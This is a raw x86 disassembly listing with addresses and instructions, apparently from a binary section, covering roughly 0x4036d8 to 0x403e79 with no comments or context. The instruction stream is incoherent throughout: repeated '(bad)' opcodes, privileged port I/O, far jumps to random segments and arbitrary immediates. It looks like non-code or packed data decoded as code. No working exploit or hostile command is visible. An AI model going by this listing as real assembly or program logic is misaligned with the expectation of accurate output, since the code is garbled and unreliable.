  4036d8:	outs   dx,BYTE PTR ds:[esi]
  4036d9:	inc    eax
  4036da:	sub    cl,ah
  4036dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036dd:	ins    DWORD PTR es:[edi],dx
  4036de:	lods   al,BYTE PTR ds:[esi]
  4036df:	mov    edx,0xe686cf3b
  4036e4:	test   eax,0xb7bd6b09
  4036e9:	popa   
  4036ea:	mov    esp,0x1cbc734a
  4036ef:	pop    esp
  4036f0:	addr16 jmp 0xadd1:0xcfce5cd
  4036f8:	(bad)  
  4036f9:	cmp    cl,BYTE PTR [ebp+0x4901c182]
  4036ff:	adc    esi,DWORD PTR [esi]
  403701:	mov    al,0xf
  403703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403704:	inc    esi
  403705:	mov    ds:0x723e2966,eax
  40370a:	mov    cl,BYTE PTR [edx+0x41]
  40370d:	mov    ch,0x5a
  40370f:	in     al,0xc4
  403711:	cmp    dh,0x34
  403714:	sub    al,ah
  403716:	mov    DWORD PTR [esi-0x76],edi
  403719:	cwde   
  40371a:	ds ins DWORD PTR es:[edi],dx
  40371c:	xchg   esp,eax
  40371d:	xchg   ebx,eax
  40371e:	mov    ds:0xf1c610c6,al
  403723:	inc    ebx
  403724:	mov    ah,0xfd
  403726:	fwait
  403727:	push   edi
  403728:	mov    cl,BYTE PTR [ebp+0x71e8879c]
  40372e:	xchg   edx,eax
  40372f:	or     dl,ah
  403731:	push   esi
  403732:	mov    WORD PTR [ebp-0x680e3131],es
  403738:	adc    eax,0x6788db80
  40373d:	mov    al,BYTE PTR [esi]
  40373f:	cmp    ebp,DWORD PTR [edi]
  403741:	mov    DWORD PTR [ecx],eax
  403743:	popf   
  403744:	idiv   BYTE PTR [ebp-0x3ce4db1f]
  40374a:	jecxz  0x403755
  40374c:	fdivp  st(4),st
  40374e:	sub    eax,0xe99f2b88
  403753:	shl    BYTE PTR [eax+0x237bbd62],cl
  403759:	pop    ecx
  40375a:	stos   BYTE PTR es:[edi],al
  40375b:	in     eax,0x48
  40375d:	xchg   esi,eax
  40375e:	xor    DWORD PTR [ebp+0x2f],edi
  403761:	push   esp
  403762:	and    al,BYTE PTR [ebx-0x3630cd68]
  403768:	xlat   BYTE PTR ds:[ebx]
  403769:	scas   eax,DWORD PTR es:[edi]
  40376a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376b:	pop    ds
  40376c:	adc    eax,0x4262b764
  403771:	js     0x4036f3
  403773:	pusha  
  403774:	int    0x3e
  403776:	mov    esi,esp
  403778:	jb     0x4037be
  40377a:	mov    ch,0xa1
  40377c:	ret    
  40377d:	clc    
  40377e:	(bad)  
  40377f:	call   0xab974fd4
  403784:	dec    ebp
  403785:	or     DWORD PTR [ebp+0x5c],edx
  403788:	xchg   ecx,eax
  403789:	cmc    
  40378a:	add    BYTE PTR [edi-0x78],ch
  40378d:	fstp   QWORD PTR [edi]
  40378f:	scas   eax,DWORD PTR es:[edi]
  403790:	or     al,BYTE PTR [edx+ebx*8+0x6ac16af1]
  403797:	add    esi,ebx
  403799:	lds    ebp,FWORD PTR [ebp-0x5bdf165c]
  40379f:	scas   eax,DWORD PTR es:[edi]
  4037a0:	xor    ebx,DWORD PTR [edi+0x65]
  4037a3:	retf   0xafca
  4037a6:	cmc    
  4037a7:	leave  
  4037a8:	push   edi
  4037a9:	dec    ebp
  4037aa:	ins    BYTE PTR es:[edi],dx
  4037ab:	fadd   DWORD PTR [edx-0x49b75058]
  4037b1:	inc    edx
  4037b2:	sbb    cl,ch
  4037b4:	mov    cl,0x65
  4037b6:	mov    edi,0x7aefaaca
  4037bb:	int    0x2c
  4037bd:	clc    
  4037be:	xlat   BYTE PTR ds:[ebx]
  4037bf:	mov    esp,0x517332ac
  4037c4:	mov    edi,0xc813702c
  4037c9:	aam    0x31
  4037cb:	pop    esi
  4037cc:	pop    edx
  4037cd:	cmp    edi,DWORD PTR [ebp-0x3f]
  4037d0:	popf   
  4037d1:	lea    ecx,[ecx+edx*4]
  4037d4:	sbb    al,0xe8
  4037d6:	xchg   edi,eax
  4037d7:	ss loopne 0x403814
  4037da:	and    ah,bl
  4037dc:	pop    ebx
  4037dd:	xchg   ebx,eax
  4037de:	mov    ebx,0x429d67ea
  4037e3:	rol    esi,0xc7
  4037e6:	sbb    BYTE PTR [ebp-0x37],bh
  4037e9:	cwde   
  4037ea:	cmp    ebp,ebp
  4037ec:	or     BYTE PTR [esi+0x6f4725fc],0x88
  4037f3:	sar    BYTE PTR [ebp+esi*2+0x4],cl
  4037f7:	mov    esi,0x82457e59
  4037fc:	push   esp
  4037fe:	arpl   WORD PTR [ebp*2+0x8f5f216],cx
  403805:	add    dh,dl
  403807:	shl    BYTE PTR ds:0x212ea8bc,cl
  40380d:	pop    ecx
  40380e:	adc    al,0xa0
  403810:	and    ah,BYTE PTR [edi]
  403812:	shr    DWORD PTR [ebx+0x68],1
  403815:	scas   eax,DWORD PTR es:[edi]
  403816:	ds hlt 
  403818:	ja     0x403870
  40381a:	rol    DWORD PTR [ebx+ecx*4+0x790d89b8],1
  403821:	adc    dh,BYTE PTR [esi+ecx*2+0x4ec00707]
  403828:	push   esi
  403829:	(bad)  
  40382a:	std    
  40382b:	cmp    DWORD PTR [esi],ecx
  40382d:	ret    
  40382e:	xor    DWORD PTR [edi+ebp*2-0x123a0785],ebx
  403835:	int3   
  403836:	xlat   BYTE PTR ds:[ebx]
  403837:	outs   dx,DWORD PTR ds:[esi]
  403838:	sub    eax,DWORD PTR [edi]
  40383a:	xchg   ebx,eax
  40383b:	retf   
  40383c:	mov    eax,ds:0x84eaae44
  403841:	lds    ecx,FWORD PTR [ecx-0x7ee989f9]
  403847:	xlat   BYTE PTR ds:[ebx]
  403848:	mov    al,ds:0xc0102c84
  40384d:	aam    0x50
  40384f:	xlat   BYTE PTR fs:[ebx]
  403851:	nop
  403852:	call   0xf7289cf6
  403857:	inc    esp
  403858:	inc    esp
  403859:	bnd ja 0x4037de
  40385c:	neg    DWORD PTR [ecx-0x15]
  40385f:	loopne 0x4038a3
  403861:	sti    
  403862:	jne    0x4038d7
  403864:	(bad)  [ebp+0x61ea5e75]
  40386a:	dec    ecx
  40386b:	test   BYTE PTR [ebx+0x481ba6c0],dh
  403871:	sbb    DWORD PTR [ecx+0x5a79f370],edi
  403877:	mov    ?,WORD PTR [esp+ecx*2-0x5845d98]
  40387e:	leave  
  40387f:	retf   
  403880:	mov    edx,0x41fd9cb6
  403885:	pusha  
  403886:	sbb    ecx,DWORD PTR [esi+0x2b3fc27]
  40388c:	push   eax
  40388d:	cwde   
  40388e:	cmp    eax,0x31506779
  403893:	push   ss
  403894:	jecxz  0x40386b
  403896:	int3   
  403897:	xchg   DWORD PTR [ebp+0x63],esi
  40389a:	(bad)  
  40389b:	pop    eax
  40389c:	and    BYTE PTR [esi-0x79],0xf0
  4038a0:	dec    ebp
  4038a1:	inc    edi
  4038a2:	fidivr WORD PTR [esi+0x4d]
  4038a5:	jns    0x4038fa
  4038a7:	sbb    DWORD PTR [ebp-0x59],ebp
  4038aa:	out    0x1b,al
  4038ac:	jge    0x4038ee
  4038ae:	cmp    al,0xed
  4038b0:	xchg   edi,eax
  4038b1:	adc    ah,BYTE PTR [esi+0x4]
  4038b4:	pop    edi
  4038b5:	mov    BYTE PTR [eax-0x77],al
  4038b8:	das    
  4038b9:	and    eax,0x38504ac9
  4038be:	scas   eax,DWORD PTR es:[edi]
  4038bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c0:	add    edx,DWORD PTR [eax+eax*4-0x368712e0]
  4038c7:	jge    0x40391f
  4038c9:	mov    dl,BYTE PTR [edi-0x39]
  4038cc:	jecxz  0x403895
  4038ce:	xchg   DWORD PTR [edx+0x11],ecx
  4038d1:	mov    dh,0x35
  4038d3:	imul   ebx,DWORD PTR [edx+ebx*8],0x8afe4ef8
  4038da:	addr16 loopne 0x403945
  4038dd:	adc    al,0xbd
  4038df:	jmp    0x9192:0x360bb798
  4038e6:	mov    DWORD PTR ds:[ebx-0x72951592],eax
  4038ed:	mov    ebx,DWORD PTR [edx+0x7ae93520]
  4038f3:	out    0x60,eax
  4038f5:	mov    dh,0x5d
  4038f7:	aaa    
  4038f8:	stos   BYTE PTR es:[edi],al
  4038f9:	retf   0x7e10
  4038fc:	ret    
  4038fd:	mov    DWORD PTR [edi-0x7d],ebx
  403900:	inc    ecx
  403901:	push   ebx
  403902:	lahf   
  403903:	imul   ecx,DWORD PTR [ecx],0x21f81ba2
  403909:	mov    esp,0xed413dff
  40390e:	cmp    dl,BYTE PTR [ebx+0x1816ee1a]
  403914:	dec    esp
  403915:	or     bl,BYTE PTR ds:0x103487e3
  40391b:	mov    DWORD PTR [eax+edx*1],edi
  40391e:	xchg   edi,eax
  40391f:	jge    0x403982
  403921:	mov    ebx,0x227d59c1
  403926:	xor    BYTE PTR [edi+ebp*8+0x10],dh
  40392a:	cmp    ebx,esp
  40392c:	xchg   BYTE PTR [ebx-0x4d683186],cl
  403932:	(bad)  
  403933:	and    al,0xd0
  403935:	mov    BYTE PTR [ebx],dl
  403937:	ror    BYTE PTR [esi-0x5e2b18fe],0xfd
  40393e:	mul    DWORD PTR ss:[ecx]
  403941:	test   eax,0x418daf69
  403946:	cmp    al,0x86
  403948:	aad    0xa0
  40394a:	daa    
  40394b:	fdivr  st(3),st
  40394d:	cmp    DWORD PTR [ecx],ebp
  40394f:	(bad)  
  403950:	fwait
  403951:	ss pop es
  403953:	mov    al,ds:0x5af9d2c2
  403958:	cli    
  403959:	test   BYTE PTR [eax+0x4527159],0xc4
  403960:	sub    BYTE PTR [ecx+0x60657ac],0xd5
  403967:	pop    ecx
  403968:	pop    ds
  403969:	fs mov edi,0x11089ee8
  40396f:	inc    esi
  403970:	cli    
  403971:	jg     0x4039e7
  403973:	mov    BYTE PTR [edi-0x62],bl
  403976:	shr    DWORD PTR [edi+ecx*1+0x1ed3435c],1
  40397d:	aaa    
  40397e:	mov    cx,WORD PTR [edi+ebp*2+0x6]
  403983:	mov    esi,0x9d899a5e
  403988:	pop    ebx
  403989:	pop    esi
  40398a:	push   edx
  40398b:	mov    bh,0xff
  40398d:	aaa    
  40398e:	cs jecxz 0x403987
  403991:	jns    0x403954
  403993:	xor    cl,BYTE PTR [edx]
  403995:	jns    0x40392d
  403997:	inc    ebp
  403998:	adc    dl,BYTE PTR [ebp-0x40]
  40399b:	adc    DWORD PTR [edx],eax
  40399d:	pop    edi
  40399e:	in     al,dx
  40399f:	test   eax,0x50f629aa
  4039a4:	pop    eax
  4039a5:	mov    edx,0x5becb402
  4039aa:	pop    ecx
  4039ab:	push   0xffffffe8
  4039ad:	xadd   DWORD PTR [esi+0x6c],edx
  4039b1:	pop    ss
  4039b2:	cmovns edi,DWORD PTR [esp+esi*4-0x1f]
  4039b7:	addr16 jnp 0x4039b7
  4039ba:	mov    ch,dh
  4039bc:	arpl   bp,si
  4039be:	mov    cl,0xad
  4039c0:	aad    0x6d
  4039c2:	mov    dl,0x44
  4039c4:	loop   0x4039f6
  4039c6:	out    dx,al
  4039c7:	xchg   esi,eax
  4039c8:	stos   BYTE PTR es:[edi],al
  4039c9:	jge    0x403983
  4039cb:	mov    edx,DWORD PTR [ebx]
  4039cd:	jae    0x4039d2
  4039cf:	and    cl,ch
  4039d1:	jge    0x4039d8
  4039d3:	retf   0xdcb5
  4039d6:	push   eax
  4039d7:	call   0x12e91567
  4039dc:	cli    
  4039dd:	out    dx,al
  4039de:	cld    
  4039df:	mov    esp,0x60859883
  4039e4:	jne    0x4039f4
  4039e6:	jmp    0x7088:0x9981b806
  4039ed:	inc    esp
  4039ee:	leave  
  4039ef:	sahf   
  4039f0:	fsub   DWORD PTR [esi-0x75]
  4039f3:	cmp    ch,bl
  4039f5:	jo     0x403a11
  4039f7:	repnz cwde 
  4039f9:	icebp  
  4039fa:	loope  0x403a51
  4039fc:	inc    ebp
  4039fd:	cmp    edi,ecx
  4039ff:	jae    0x403a7d
  403a01:	call   0x8d9c:0x704c25b2
  403a08:	pop    ebx
  403a09:	xchg   BYTE PTR [esi+0x5c],ah
  403a0c:	int    0x6c
  403a0e:	jmp    0x4039be
  403a10:	rcr    DWORD PTR [ebp-0x6a57511c],1
  403a16:	xchg   DWORD PTR [edx+0x306d26c2],edx
  403a1c:	imul   ebx,DWORD PTR [eax+eiz*2+0x160c9f65],0x14b48a63
  403a27:	sbb    DWORD PTR [ebp-0x52],0x3b
  403a2b:	add    al,0x8e
  403a2d:	repnz clc 
  403a2f:	dec    esi
  403a30:	inc    edi
  403a31:	(bad)  
  403a32:	cld    
  403a33:	sbb    al,BYTE PTR [ebx]
  403a35:	fmulp  st(2),st
  403a37:	xchg   BYTE PTR [ebx],ch
  403a39:	ret    
  403a3a:	jmp    0xa91289c
  403a3f:	popf   
  403a40:	(bad)  
  403a41:	in     eax,dx
  403a42:	in     eax,0xe9
  403a44:	pop    ebp
  403a45:	adc    al,0x32
  403a47:	pop    es
  403a48:	pop    es
  403a49:	or     bh,ah
  403a4b:	or     al,0xc4
  403a4d:	fsub   DWORD PTR [ebx]
  403a4f:	adc    BYTE PTR [ecx],ah
  403a51:	and    BYTE PTR [edx],bl
  403a53:	pop    ds
  403a54:	aam    0x6
  403a56:	je     0x403a95
  403a58:	dec    BYTE PTR [edi+0x631ca409]
  403a5e:	and    BYTE PTR [edx-0x7d],bl
  403a61:	add    ebp,DWORD PTR [ecx]
  403a63:	xor    eax,0x9a289653
  403a68:	pop    eax
  403a69:	repz add edx,DWORD PTR [ebx-0x4]
  403a6d:	sub    esp,DWORD PTR [ecx]
  403a6f:	(bad)  
  403a71:	pop    edx
  403a72:	scas   al,BYTE PTR es:[edi]
  403a73:	push   0xffffffac
  403a75:	hlt    
  403a76:	or     DWORD PTR [ecx+0x69],0xffffffae
  403a7a:	cmp    eax,0x229ab480
  403a7f:	icebp  
  403a80:	mov    ch,0x77
  403a82:	arpl   WORD PTR [edi-0x47],ax
  403a85:	add    BYTE PTR [edi-0x5cc30e84],0x97
  403a8c:	psllq  mm0,QWORD PTR [ebx]
  403a8f:	xchg   edi,eax
  403a90:	lea    ebp,[ebx-0x80]
  403a93:	and    cl,ch
  403a95:	fisubr WORD PTR [ebx-0x67cb2d3c]
  403a9b:	dec    esp
  403a9c:	cmp    DWORD PTR [edx],esp
  403a9e:	js     0x403ac7
  403aa0:	add    cl,ah
  403aa2:	sar    DWORD PTR [ebx],cl
  403aa4:	bound  esp,QWORD PTR [edx-0x2f]
  403aa7:	int3   
  403aa8:	pushf  
  403aa9:	xchg   BYTE PTR [edi+edx*1+0x3c765ff2],bl
  403ab0:	mov    ds:0x7b1c7f11,eax
  403ab5:	cld    
  403ab6:	mul    edi
  403ab8:	(bad)  
  403aba:	jl     0x403a85
  403abc:	mov    eax,0x96216fc5
  403ac1:	jge    0x403a6d
  403ac3:	sub    ah,ah
  403ac5:	(bad)  
  403ac6:	mov    ebp,0x19dda82
  403acb:	dec    ebp
  403acc:	push   edi
  403acd:	pop    edi
  403ace:	shl    BYTE PTR [ebx+0x5759c6],0x3c
  403ad5:	nop
  403ad6:	pop    eax
  403ad7:	inc    esi
  403ad8:	xlat   BYTE PTR ds:[ebx]
  403ad9:	aas    
  403ada:	mov    al,ds:0x7cf45d10
  403adf:	pop    ebp
  403ae0:	mov    DWORD PTR [edx+0x206cf95],edi
  403ae6:	iret   
  403ae7:	dec    ebx
  403ae8:	arpl   bx,cx
  403aea:	xlat   BYTE PTR ds:[ebx]
  403aeb:	fcmovnb st,st(4)
  403aed:	cmp    cl,BYTE PTR [eax-0x403d0e62]
  403af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af4:	pop    ecx
  403af5:	ds jbe 0x403ac8
  403af8:	xor    esi,DWORD PTR [ecx+0x7b]
  403afb:	in     eax,dx
  403afc:	sub    al,0xad
  403afe:	stc    
  403aff:	jb     0x403b2c
  403b01:	dec    ebx
  403b02:	pop    ebx
  403b03:	mov    dl,0xd
  403b05:	push   ds
  403b06:	jmp    DWORD PTR [edx+0x7b4efc45]
  403b0c:	push   ebx
  403b0d:	add    al,0x89
  403b0f:	(bad)  
  403b10:	fldln2 
  403b12:	fnstsw WORD PTR [edx+0x13008775]
  403b18:	add    eax,0x8e8fe1c0
  403b1d:	js     0x403af0
  403b1f:	popf   
  403b20:	pusha  
  403b21:	retf   
  403b22:	jno    0x403b58
  403b24:	sub    eax,0x45be7e04
  403b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b2a:	(bad)  
  403b2c:	nop
  403b2d:	fs xchg ebp,eax
  403b2f:	pop    esi
  403b30:	add    BYTE PTR [ebp+eax*2+0x51e64586],ah
  403b37:	retf   
  403b38:	cdq    
  403b39:	fiadd  WORD PTR [edx+edi*4-0x3ee492f1]
  403b40:	cdq    
  403b41:	shl    BYTE PTR [ecx-0x42],cl
  403b44:	cmc    
  403b45:	jb     0x403ae0
  403b47:	stos   DWORD PTR es:[edi],eax
  403b48:	and    eax,0xd86492a4
  403b4d:	test   BYTE PTR [eax],al
  403b4f:	sub    al,0x54
  403b51:	or     ebx,DWORD PTR [edx-0x45]
  403b54:	add    DWORD PTR [ecx+0x78],ebp
  403b57:	cdq    
  403b58:	push   edx
  403b59:	leave  
  403b5a:	sbb    al,0xbb
  403b5c:	cld    
  403b5d:	pop    ecx
  403b5e:	add    cl,cl
  403b60:	xchg   esi,eax
  403b61:	push   cs
  403b62:	and    BYTE PTR [eax+0x531d61c3],0x7d
  403b69:	push   0x76
  403b6b:	pop    edx
  403b6c:	pop    ss
  403b6d:	ja     0x403bc8
  403b6f:	inc    BYTE PTR [ebx]
  403b71:	ret    0xaba
  403b74:	pop    esp
  403b75:	xor    al,0x90
  403b77:	out    0xd9,al
  403b79:	les    eax,FWORD PTR [eax-0x7a]
  403b7c:	or     eax,0x8a27e397
  403b81:	test   BYTE PTR ds:0x374a4fd0,ah
  403b87:	pop    ebp
  403b88:	scas   al,BYTE PTR es:[edi]
  403b89:	inc    ecx
  403b8a:	dec    ecx
  403b8b:	lods   al,BYTE PTR ds:[esi]
  403b8c:	mov    DWORD PTR [esi-0x29],esi
  403b8f:	mov    esp,0x4d1422a4
  403b94:	mov    ss,WORD PTR [edi-0x57]
  403b97:	dec    esi
  403b98:	push   esi
  403b99:	inc    esp
  403b9a:	pop    es
  403b9b:	add    eax,0x549c428a
  403ba0:	mov    bh,0x38
  403ba2:	fbld   TBYTE PTR ds:[ebx+0x15]
  403ba6:	aaa    
  403ba7:	std    
  403ba8:	jns    0x403b6f
  403baa:	add    eax,0xe8076ad9
  403baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bb0:	push   esi
  403bb1:	ret    
  403bb2:	call   0x4c8d20a1
  403bb7:	cdq    
  403bb8:	fnstenv [bp+di+0x340e]
  403bbd:	pushf  
  403bbe:	push   ecx
  403bbf:	xor    dl,BYTE PTR [ebx]
  403bc1:	fwait
  403bc2:	mov    cs,ecx
  403bc4:	ror    ah,0xbc
  403bc7:	imul   esi,ecx,0xffffff8b
  403bca:	push   ss
  403bcb:	lods   eax,DWORD PTR ds:[esi]
  403bcc:	call   0xf5436c46
  403bd1:	ins    DWORD PTR es:[edi],dx
  403bd2:	lea    esi,[ebp+0x1]
  403bd5:	stos   BYTE PTR es:[edi],al
  403bd6:	in     eax,dx
  403bd7:	and    ah,cl
  403bd9:	ficomp WORD PTR [ebx+ecx*4+0x32bcdb59]
  403be0:	ret    
  403be1:	pop    es
  403be2:	popa   
  403be3:	jbe    0x403c52
  403be5:	jbe    0x403c48
  403be7:	lea    edx,[esi+0x3b]
  403bea:	sub    dh,BYTE PTR [esi+edi*8-0x3edb080c]
  403bf1:	jle    0x403bf2
  403bf3:	aad    0x26
  403bf5:	inc    edx
  403bf6:	jg     0x403b86
  403bf8:	inc    esp
  403bf9:	sbb    eax,0xe129d652
  403bfe:	adc    edi,0x35f0dc4
  403c04:	call   0x4d49:0xdb8539e8
  403c0b:	xlat   BYTE PTR ds:[ebx]
  403c0c:	inc    esi
  403c0d:	icebp  
  403c0e:	clc    
  403c0f:	sbb    DWORD PTR [ecx-0x3c],0x50
  403c13:	mov    ds:0xbc51f85c,eax
  403c18:	retf   
  403c19:	jle    0x403c0c
  403c1b:	bound  eax,QWORD PTR [esi-0x1b967d91]
  403c21:	xchg   edx,eax
  403c22:	cmp    eax,0xc07dade9
  403c27:	jns    0x403c61
  403c29:	sti    
  403c2a:	and    DWORD PTR ds:0xedf787e2,ebp
  403c30:	sub    eax,0x3a80b2b3
  403c35:	xor    esp,DWORD PTR [eax-0x28]
  403c38:	push   esi
  403c39:	std    
  403c3a:	xchg   ebp,eax
  403c3b:	inc    esi
  403c3c:	ja     0x403c29
  403c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c3f:	add    dl,BYTE PTR [edx-0x40d89c82]
  403c45:	adc    al,0xae
  403c47:	inc    BYTE PTR [esi]
  403c49:	sbb    cl,BYTE PTR ds:[edi+edx*4+0x27e73b5d]
  403c51:	and    BYTE PTR [edi-0x73914cb8],dh
  403c57:	(bad)  
  403c58:	sub    ecx,DWORD PTR [ecx]
  403c5a:	call   0x5ed41c05
  403c5f:	add    DWORD PTR [edi],edi
  403c61:	ins    DWORD PTR es:[edi],dx
  403c62:	shr    DWORD PTR [edx-0x75],1
  403c65:	push   ebx
  403c66:	(bad)  
  403c67:	sbb    esi,DWORD PTR [eax+ebx*4+0x17]
  403c6b:	jl     0x403c84
  403c6d:	mov    dl,0x53
  403c6f:	leave  
  403c70:	in     eax,0x33
  403c72:	scas   al,BYTE PTR es:[edi]
  403c73:	cld    
  403c74:	jp     0x403c90
  403c76:	mov    eax,DWORD PTR [edi]
  403c78:	pop    ebx
  403c79:	xor    ah,BYTE PTR [ecx-0xd]
  403c7c:	idiv   DWORD PTR [eax]
  403c7e:	in     al,0x7
  403c80:	sub    ah,BYTE PTR [edx+0x61]
  403c83:	test   ecx,edi
  403c85:	retf   
  403c86:	adc    ecx,0x12
  403c89:	in     al,0xbe
  403c8b:	or     DWORD PTR [edx],ebx
  403c8d:	sbb    BYTE PTR [esi+0x3e],dh
  403c90:	out    dx,al
  403c91:	aam    0x8a
  403c93:	hlt    
  403c94:	enter  0x40c6,0x3a
  403c98:	lds    ebp,FWORD PTR ds:0xe8650737
  403c9e:	push   0x95c6bd00
  403ca3:	add    BYTE PTR [ebp-0x31],dl
  403ca6:	push   eax
  403ca7:	push   ecx
  403ca8:	ss mov dh,0x4c
  403cab:	scas   al,BYTE PTR es:[edi]
  403cac:	scas   al,BYTE PTR es:[edi]
  403cad:	xor    al,0x88
  403caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb0:	cwde   
  403cb1:	loopne 0x403c7b
  403cb3:	xor    BYTE PTR [esi],0x55
  403cb6:	and    BYTE PTR [edi+0x22],0xfd
  403cba:	jmp    0x817d:0x41438474
  403cc1:	ins    BYTE PTR es:[edi],dx
  403cc2:	std    
  403cc3:	arpl   WORD PTR [edi+0x58],ax
  403cc6:	mov    edx,0xc13573d2
  403ccb:	and    al,0x44
  403ccd:	loopne 0x403c96
  403ccf:	test   eax,0xc2b8a1cf
  403cd4:	mov    eax,ds:0xda9c4202
  403cd9:	popf   
  403cda:	scas   eax,DWORD PTR es:[edi]
  403cdb:	sbb    ebx,edx
  403cdd:	inc    edx
  403cde:	lods   al,BYTE PTR ds:[esi]
  403cdf:	cmp    eax,0x21cb45b2
  403ce4:	adc    eax,0x412f120d
  403ce9:	ds (bad) 
  403ceb:	xchg   esp,eax
  403cec:	pop    esi
  403ced:	sbb    BYTE PTR [ecx-0x1803713f],ch
  403cf3:	das    
  403cf4:	sub    DWORD PTR [edx+edx*4+0x5e9f98d9],0xfffffffd
  403cfc:	mov    ah,0x70
  403cfe:	(bad)  
  403cff:	fdivr  DWORD PTR [ebp-0x13eb5fa3]
  403d05:	cmp    ch,BYTE PTR [ebx-0xfb7595c]
  403d0b:	into   
  403d0c:	sbb    dl,BYTE PTR [edi-0x4c]
  403d0f:	xor    eax,0x4cc81238
  403d14:	sbb    al,BYTE PTR [ebp+0x3e349e29]
  403d1a:	outs   dx,DWORD PTR ds:[esi]
  403d1b:	js     0x403cd4
  403d1d:	data16 adc al,0x79
  403d20:	in     al,0x86
  403d22:	(bad)  
  403d23:	adc    cl,ch
  403d25:	mov    esi,cs
  403d27:	int3   
  403d28:	daa    
  403d29:	cs mov bl,0x2b
  403d2c:	and    DWORD PTR [ebp-0x51],esi
  403d2f:	cwde   
  403d30:	call   0xc81f0fa9
  403d35:	cmp    cl,BYTE PTR [ebp+0x76]
  403d38:	adc    BYTE PTR [eax],dh
  403d3a:	mov    eax,0x5ef4f68e
  403d3f:	scas   al,BYTE PTR es:[edi]
  403d40:	enter  0x3c00,0xec
  403d44:	stos   DWORD PTR es:[edi],eax
  403d45:	les    ebp,FWORD PTR [ecx+0x74]
  403d48:	cmp    BYTE PTR ds:0xfa621db4,bl
  403d4e:	dec    esp
  403d4f:	sti    
  403d50:	xchg   edi,eax
  403d51:	es addr16 mov edx,0x536da498
  403d58:	pop    esp
  403d59:	adc    dl,dl
  403d5b:	and    ebp,edi
  403d5d:	push   edx
  403d5e:	sub    esi,ebx
  403d60:	in     eax,dx
  403d61:	add    DWORD PTR [eax-0x14],0x6c
  403d65:	daa    
  403d66:	jmp    0x403d69
  403d68:	adc    DWORD PTR [ebx+0x3370574e],ebp
  403d6e:	pop    es
  403d6f:	mov    dh,0xed
  403d71:	or     BYTE PTR [ebx+0x5cbad824],cl
  403d77:	ds push esp
  403d79:	(bad)  
  403d7a:	xor    bl,bl
  403d7c:	dec    ebp
  403d7d:	int    0x4c
  403d7f:	in     al,dx
  403d80:	jo     0x403dad
  403d82:	jne    0x403d37
  403d84:	out    0x1,eax
  403d86:	lds    ebx,FWORD PTR [edx+0x6f]
  403d89:	arpl   WORD PTR [eax-0x7b],ax
  403d8c:	ds or  edx,esi
  403d8f:	mov    al,0x1a
  403d91:	iret   
  403d92:	or     eax,0x7786c4ee
  403d97:	pop    esi
  403d98:	mov    esi,0x4c9422
  403d9d:	int    0xf8
  403d9f:	pop    esi
  403da0:	cwde   
  403da1:	push   0xdd14f6de
  403da6:	jle    0x403dfc
  403da8:	push   es
  403da9:	xor    eax,0x5492bc23
  403dae:	push   esi
  403daf:	mov    edi,DWORD PTR [eiz*1-0x3f8286fe]
  403db6:	repz inc esp
  403db8:	or     BYTE PTR [edi],dh
  403dba:	dec    edx
  403dbb:	mov    bl,0xdc
  403dbd:	xor    BYTE PTR [ebx],bh
  403dbf:	inc    edx
  403dc0:	int3   
  403dc1:	outs   dx,DWORD PTR ds:[esi]
  403dc2:	add    ah,BYTE PTR [edi]
  403dc4:	jg     0x403d47
  403dc6:	das    
  403dc7:	sub    ecx,DWORD PTR [edi-0x76451ef6]
  403dcd:	mov    dl,0xcb
  403dcf:	jo     0x403d6b
  403dd1:	push   ds
  403dd2:	inc    edi
  403dd3:	cli    
  403dd4:	(bad)  
  403dd5:	mov    ds:0xadb38a99,eax
  403dda:	mov    bh,0xaf
  403ddc:	dec    ebx
  403ddd:	je     0x403e5a
  403ddf:	push   esi
  403de0:	inc    ecx
  403de1:	xchg   DWORD PTR [edi+0x3a],edx
  403de4:	in     al,0x99
  403de6:	inc    ebp
  403de7:	out    dx,al
  403de8:	in     al,0xe6
  403dea:	sbb    DWORD PTR [edx+0x6f3aa4ef],0xd76486cc
  403df4:	fistp  WORD PTR [esi+ecx*2-0x63]
  403df8:	dec    edx
  403df9:	xchg   esp,eax
  403dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dfb:	enter  0x9fe2,0x56
  403dff:	das    
  403e00:	(bad)  
  403e02:	mov    esp,0xfbe1c1d1
  403e07:	adc    DWORD PTR [ebx+0x7f],ebx
  403e0a:	out    dx,eax
  403e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e0c:	imul   eax,DWORD PTR [eax+eax*1-0x1d],0xa162e980
  403e14:	adc    al,0x6b
  403e16:	mov    ah,0x21
  403e18:	faddp  st(4),st
  403e1a:	pushf  
  403e1b:	push   esi
  403e1c:	and    BYTE PTR [ebp+0x7e],0xfa
  403e20:	fstp   DWORD PTR [esi-0x54]
  403e23:	add    al,0x26
  403e25:	int    0xb9
  403e27:	int3   
  403e28:	adc    dl,BYTE PTR [esi+0x23b5c3b3]
  403e2e:	stc    
  403e2f:	add    DWORD PTR [edx],0x25
  403e32:	nop
  403e33:	icebp  
  403e34:	dec    eax
  403e35:	mov    eax,ds:0x79fc8f69
  403e3a:	addr16 adc edi,edx
  403e3d:	cmp    eax,0xa848847f
  403e42:	das    
  403e43:	xchg   esp,eax
  403e44:	stos   BYTE PTR es:[edi],al
  403e45:	or     BYTE PTR [edx+0x3e],dh
  403e48:	(bad)  
  403e49:	push   0x15
  403e4b:	leave  
  403e4c:	mov    edx,0x1e9c60bb
  403e51:	push   edx
  403e52:	das    
  403e53:	clc    
  403e54:	xor    DWORD PTR [edi-0x1f311947],ebx
  403e5a:	dec    ebp
  403e5b:	repnz pop esp
  403e5d:	nop
  403e5e:	adc    DWORD PTR [ebx-0x53d659bc],ecx
  403e64:	pop    es
  403e65:	pushf  
  403e66:	(bad)  
  403e67:	out    dx,eax
  403e68:	push   ds
  403e69:	pop    eax
  403e6a:	rcr    BYTE PTR [ecx+eax*4],0x8a
  403e6e:	adc    ch,bh
  403e70:	cwde   
  403e71:	cmc    
  403e72:	pop    ebx
  403e73:	ret    0x868b
  403e76:	js     0x403e20
  403e78:	dec    edi
  403e79:	inc    esi
